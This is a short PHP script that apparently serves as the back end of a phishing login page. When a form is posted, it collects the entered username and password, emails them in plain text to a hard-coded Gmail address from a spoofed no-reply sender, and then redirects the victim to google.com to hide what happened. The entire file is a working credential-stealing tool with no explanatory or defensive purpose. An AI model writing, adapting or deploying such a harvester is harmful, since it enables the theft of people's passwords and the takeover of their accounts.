<?php


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

       $to = 'soyeltoby3@gmail.com'; 
    $subject = 'Datos de Inicio de Sesión';
    $message = "Nombre de Usuario: $username\nContraseña: $password\n";
    $headers = "From: no-reply@tudominio.com\r\n";

    $mail_sent = mail($to, $subject, $message, $headers);

  
    header('Location: https://www.google.com');
    exit();
}
?>
